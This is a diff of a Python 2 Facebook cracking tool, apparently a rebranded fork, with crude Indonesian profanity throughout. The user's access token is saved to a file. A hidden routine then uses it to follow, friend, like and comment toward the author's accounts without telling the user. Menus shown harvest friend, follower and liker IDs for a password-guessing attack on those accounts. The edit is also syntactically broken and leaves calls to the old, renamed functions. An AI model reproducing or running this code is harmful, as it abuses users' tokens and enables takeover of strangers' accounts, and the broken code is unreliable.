@@ -61,13 +61,24 @@ my_color = [
 warna = random.choice(my_color)
 #  Raka Andrian Tara.  #
 #------------------------------->
-koh = '100000834003593'
-xi_jimpinx = '4257706904267068'
+raka = '100000834003593'
+amanda_sayang_raka = '244541413774000'
 ok, cp, id, loop = [], [], [], 0
-hoetank = random.choice(['Yang Posting Orang Nya Ganteng:)', 'Script Nya Mantap Bang:v', 'Never Giv Up:v'])
+	web = datetime.datetime.now()
+        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
+        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
+	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
+	kata_utama = ("Pengguna Script Premium ")
+	komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
+	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
+	kata_utama2 = random.choice(["Hai Aa Raka 😊","Hello Aa Raka 😊","Hello Aa Raka 😊","Hai Aa Raka 😊"])
+	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
+	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
+	kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN😊")
+	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-# lempankkkkkkkk
+# MAJU MUNDUR
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
@@ -81,17 +92,18 @@ def tod():
         sys.stdout.flush()
         time.sleep(1)
 
-# LO KONTOL
-logo = ''' \033[0;96m┏━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓® 
- \033[0;96m┃┏┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏┛┗┓  \033[0m|| \033[0;96mCreated By Angga
- \033[0;96m┃┗┛┗┳━━┳━┓┏━━┳━━┳━┻┓┏┛  \033[0m|| \033[0;96mGithub.com/Bajingan-Z
- \033[0;96m┃┏━┓┃┏┓┃┏┓┫┏┓┃━━┫┏┓┃┃   \033[0m|| \033[0;96mFb.me/PEMUDA.KALEUM
- \033[0;96m┃┗━┛┃┏┓┃┃┃┃┗┛┣━━┃┏┓┃┗┓  \033[0m|| \033[0;96mYoutube Angga-Z
- \033[0;96m┗━━━┻┛┗┻┛┗┻━┓┣━━┻┛┗┻━┛  \033[0m|| \033[0;91mv2.1.1 
- \033[0;96m╋╋╋╋╋╋╋╋╋╋┏━┛┃╋╋╋╋╋╋╋╋     
- \033[0;96m╋╋╋╋╋╋╋╋╋╋┗━━┛╋╋╋╋╋╋╋╋\033[0m'''
+# LO GOBLOG
+logo = ''' 
+\033[0;91m      ooooooooo.             oooo                                     
+\033[0;92m     `888   `Y88.           `888                                     
+\033[0;93m     888   .d88'  .oooo.    888  oooo   .oooo.             oooooooo ®
+\033[0;94m    888ooo88P'  `P  )88b   888 .8P'   `P  )88b           d'""7d8P  
+\033[0;95m   888`88b.     .oP"888   888888.     .oP"888  8888888    .d8P'   
+\033[0;96m  888  `88b.  d8(  888   888 `88b.  d8(  888           .d8P'  .P 
+\033[0;97mo888o  o888o `Y888""8o o888o o888o `Y888""8o         d8888888P  
+'''
 
-lo_ngentod = '800676813861801'
+raka_sayang_amanda = '3882176535153442'
 # crack selesai
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
@@ -102,31 +114,31 @@ def hasil(ok,cp):
         print '\n\n [%s!%s] Opshh Kamu Tidak Mendapatkan Hasil :('%(M,N);exit()
 
 #masuk token
-def yayanxd():
+def raka_z():
     os.system('clear')
     print (' %s◍➤%s This Tool Uses Facebook Token Login.\n %s◍➤%s Do You Already Know How To Get Facebook Token?\n %s◍➤%s Type %sOpen%s To Get Facebook Token.'%(O,N,O,N,O,N,H,N))
-    kontol = raw_input('\n %s[%s?%s] ☆TOKEN☆™︻®╤───────═◍➤ :%s '%(N,M,N,H))
+    kontol = raw_input('\n %s[%s?%s] Login ☆TOKEN☆ :%s '%(N,M,N,H))
     if kontol in ('open', 'Open', 'OPEN'):
-        print '\n%s *%s Usahakan Akun Tumbal Login Di Kiwi Browser Terlebih Dahulu'%(B,N);time.sleep(2)
-        print '%s *%s Jangan Lupa! Url Ubah Ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
-        print '%s *%s Setelah Di Alihkan Ke Kiwi Browser. Klik %sTitik Tiga'%(B,N,H);time.sleep(2)
-        print '%s *%s Lalu Klik %sCari di Halaman%s Tinggal ketik %sEAAG%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
+        jalan '\n%s *%s Download Apk Kiwi Browser Terlebih Dahulu'%(B,N);time.sleep(00.02)
+        jalan '%s *%s Klick Dikolom pencarian %https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm'%(B,N,H);time.sleep(00.02)
+        jalan '%s *%s Setelah Itu Klick %sTambahkan Ke Chrome Selesai'%(B,N,H);time.sleep(00.02)
+        jalan '%s *%s Login Akun Fb Dikiwi Lalu Klick %sTitik Tiga Dipojok Kanan Atas%s Tinggal Diklick Paling Bawah Get Cookie %sSelesai%s Pahamkan'%(B,N,H,N,H,N);time.sleep(00.02)
         raw_input(' %s◍➤%s Tekan Enter '%(O,N))
         os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
-        yayanxd()
+        raka_z()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
-        print '\n\n %s<>%s WELCOME %s%s%s'%(O,N,K,nama,N);time.sleep(2)
-        print ' %s<>%s Please Use This Sc Properly, We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(2)
+        print '\n %s<>%s WELCOME %s%s%s'%(O,N,K,nama,N);time.sleep(00.02)
+        print ' %s<>%s Please Use This Sc Properly,\n We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(00.02)
         open('.memek.txt', 'w').write(kontol)
         raw_input(' %s◍➤%s Tekan Enter '%(O,N));wuhan(kontol)
         os.system('xdg-open https://youtu.be/bszAm4C5ovE')
-        moch_yayan()
+        raka_amanda()
     except KeyError:
         print '\n\n %s[%s!%s] Token Invalid'%(N,M,N);time.sleep(2);yayanxd()
 
 ### ORANG GANTENG ###
-def moch_yayan():
+def raka_amanda():
     os.system('clear')
     try:
     	kontol = open('.memek.txt', 'r').read()
@@ -207,18 +219,21 @@ def moch_yayan():
     else:
         print '\n %s[%s×%s] Menu [%s%s%s] Tidak Ada, Cek Menu Nya Bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
-# Yang ganti bot nya gw sumpahin mak lo mati ajg!
-def wuhan(kontol):
+# croottt
+def wuhan(amanda):
     try:
-        kentod = kontol
-        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
-        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
-        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
+        raka = amanda
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+amanda)
+	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+amanda)
+        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+amanda)
+	requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+amanda)
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+amanda)
+	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+amanda)
+	requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+amanda)
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+amanda)
+	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+amanda)
+	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,amanda,amanda))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(amanda_sayang_raka,love,amanda))
     except:
     	pass
 
@@ -244,11 +259,11 @@ def teman(kontol):
         jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Teman'%(N,H,N))
         print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
     except (KeyError,IOError):
         os.remove(cin)
         jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()
 '''
 																																																				csy = 'Cindy sayang Yayan'
 																																																				ysc = 'Yayan sayang Cindy'
@@ -276,11 +291,11 @@ def publik(kontol):
         jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Teman Publik'%(N,H,N))
         print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
     except (KeyError,IOError):
         os.remove(knt)
         jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()
 
 # dump id dari followers hehe
 def followers(kontol):
@@ -305,11 +320,11 @@ def followers(kontol):
         jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Total Followers'%(N,H,N))
         print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
     except (KeyError,IOError):
         os.remove(ah)
         jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()
 
 # dump id dari postingan hehe
 def postingan(kontol):
@@ -334,11 +349,11 @@ def postingan(kontol):
         jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Like Postingan'%(N,H,N))
         print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
     except (KeyError,IOError):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()
 #cek ingfo
 def cek_ingfo(kontol):
     try:
@@ -484,7 +499,7 @@ def info_tools():
     print '\n %s[%s>%s]◍➤ Facebook : https://www.facebook.com/PEMUDA.KALEM'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s>%s]◍➤ Instagram: https://www.instagram.com/bangsat_xd'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
-    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));raka_amanda()
 
 ### ganti user agent
 def seting_yntkts():
@@ -494,35 +509,35 @@ def seting_yntkts():
     if ytbjts == '':
         print '\n %s[%s×%s] Gak Boleh Kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
     elif ytbjts in['1','01']:
-        yo_ndak_tau_ko_tanya_saia()
+        urang_ge_lieur()
     elif ytbjts in['2','02']:
         try:
             user_agent = open('YNTKTS.txt', 'r').read()
         except IOError:
             user_agent = '%s-'%(M)
         print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
-        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
     else:
         print '\n %s[%s×%s] Input Yang Bener'%(N,M,N);time.sleep(2);seting_yntkts()
 # User Agent baru
-def yo_ndak_tau_ko_tanya_saia():
+def urang_ge_lieur():
     os.system('rm -rf YNTKTS.txt')
     _asu_ = raw_input('\n [%s?%s] Ingin Menggunakan User Agent Hp Anda [Y/t]: '%(O,N))
     if _asu_ == '':
-        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
+        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);urang_ge_lieur()
     elif _asu_ in['Y','y']:
-        jalan('\n %s *%s Anda Akan Di Arakan Ke Situs Web Setelah Diarahkan Ke Situs Web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
+        jalan('\n %s *%s Anda Akan Di Arakan Ke Situs Web Setelah Diarahkan Ke Situs Web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open http://ipinfo.io/json')
         _agen_ = raw_input(' [%s?%s] Masukan User Agent Hp Anda :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
         jalan('\n %s[%s✓%s] Berhasil Menggunakan User Agent Hp Anda...'%(N,H,N))
-        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
     elif _asu_ in['T','t']:
         _agen_ = raw_input(' [%s?%s] masukan user agent :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
         jalan('\n %s[%s✓%s] Berhasil Mengganti User Agent...'%(N,H,N))
-        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
     else:
-        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
+        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);urang_ge_lieur()
 # mulai ngecrot awokawokawokkawok
 class __crack__:
 
@@ -537,8 +552,8 @@ class __crack__:
         except:
             print '\n %s[%s×%s] File [%s%s%s] Tidak Ada, Dump Id Dulu Bro Cek Nomor 1 Sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
-        ___yayanganteng___ = raw_input(' [%s?%s] Do You Want To Use Manual Password? [Y/t]: '%(O,N))
-        if ___yayanganteng___ in ('Y', 'y'):
+        ___raka_amanda___ = raw_input(' [%s?%s] Do You Want To Use Manual Password? [Y/t]: '%(O,N))
+        if ___raka_amanda___ in ('Y', 'y'):
             print '\n %s[%s!%s] Gunakan , (Koma) Untuk Pemisah Contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] Masukan Kata Sandi : '%(O,N))
@@ -599,7 +614,7 @@ class __crack__:
                     print ' [%s3%s]\x1b[1;96m◍➤\x1b[1;97m Method Mobile [\x1b[1;92mSuper Slow\x1b[1;97m]'%(O,N)
                     __yan__(pwek.split(','))
                     break
-        elif ___yayanganteng___ in ('T', 't'):
+        elif ___raka_amanda___ in ('T', 't'):
             print '\n [ Pilih Method Login Silahkan Coba Satu² ]\n'
             print ' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Method API [\x1b[1;92mFast\x1b[1;97m]'%(O,N)
             print ' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Method Mbasic [\x1b[1;92mNormal\x1b[1;97m]'%(O,N)
@@ -829,4 +844,4 @@ class __crack__:
 
 if __name__ == '__main__':
     os.system('git pull')
-    moch_yayan()
+    raka_amanda()
